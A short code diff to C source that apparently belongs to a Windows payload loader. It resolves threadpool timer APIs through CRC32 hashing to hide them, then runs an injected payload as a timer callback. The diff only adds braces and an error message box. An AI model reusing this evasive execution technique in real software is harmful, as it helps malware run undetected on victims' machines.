@@ -64,7 +64,9 @@ VOID Execute(PVOID pInjectedPayload)
     PTP_TIMER				ptpTimer		= NULL;
 
     if (!pInjectedPayload)
+    {
         return;
+    }
 
     fnCreateThreadpoolTimer				pCreateThreadpoolTimer				= (fnCreateThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32_CRC32), CreateThreadpoolTimer_CRC32);
     fnSetThreadpoolTimer				pSetThreadpoolTimer					= (fnSetThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32_CRC32), SetThreadpoolTimer_CRC32);
@@ -78,6 +80,7 @@ VOID Execute(PVOID pInjectedPayload)
 
     if (!(ptpTimer = pCreateThreadpoolTimer((PTP_TIMER_CALLBACK)pInjectedPayload, NULL, &tpCallbackEnv)))
     {
+        MessageBoxA(NULL, "ERROR", "ERROR", MB_OK);
         return;
     }
 
